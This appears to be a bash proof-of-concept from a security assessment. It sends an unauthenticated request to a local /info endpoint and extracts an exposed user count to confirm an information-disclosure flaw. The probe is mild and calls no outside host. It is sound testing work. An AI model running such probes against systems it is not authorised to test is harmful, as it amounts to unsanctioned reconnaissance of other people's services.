#!/bin/bash

# POC: Information Disclosure - Unauthenticated User Count Leakage
# This script demonstrates that the /info endpoint exposes sensitive
# user count information without requiring authentication

TARGET_URL="http://localhost:3000/info"
RESPONSE_FILE="/tmp/info_response.html"

echo "=========================================="
echo "POC: Information Disclosure via /info"
echo "=========================================="
echo ""

# Test 1: Access /info endpoint without any authentication
echo "[*] Step 1: Accessing /info endpoint without authentication..."
echo "[*] URL: $TARGET_URL"
echo ""

HTTP_CODE=$(curl -s -o "$RESPONSE_FILE" -w "%{http_code}" "$TARGET_URL")

echo "[+] HTTP Response Code: $HTTP_CODE"
echo ""

# Check if we got a successful response
if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] SUCCESS: Endpoint is accessible without authentication (HTTP 200)"
    echo ""
    
    # Test 2: Extract and display the user count
    echo "[*] Step 2: Extracting user count from response..."
    USER_COUNT=$(grep -oP 'Total users:\s*\K\d+' "$RESPONSE_FILE" || echo "NOT FOUND")
    
    if [ "$USER_COUNT" != "NOT FOUND" ]; then
        echo "[+] VULNERABLE: User count exposed: $USER_COUNT"
        echo ""
        echo "[+] Full response containing sensitive information:"
        echo "---"
        cat "$RESPONSE_FILE"
        echo ""
        echo "---"
        echo ""
        echo "[!] VULNERABILITY CONFIRMED: Unauthenticated users can access user count"
        exit 0
    else
        echo "[-] Could not extract user count from response"
        echo "[*] Response content:"
        cat "$RESPONSE_FILE"
        exit 1
    fi
else
    echo "[-] Unexpected HTTP response code: $HTTP_CODE"
    echo "[*] Response content:"
    cat "$RESPONSE_FILE"
    exit 1
fi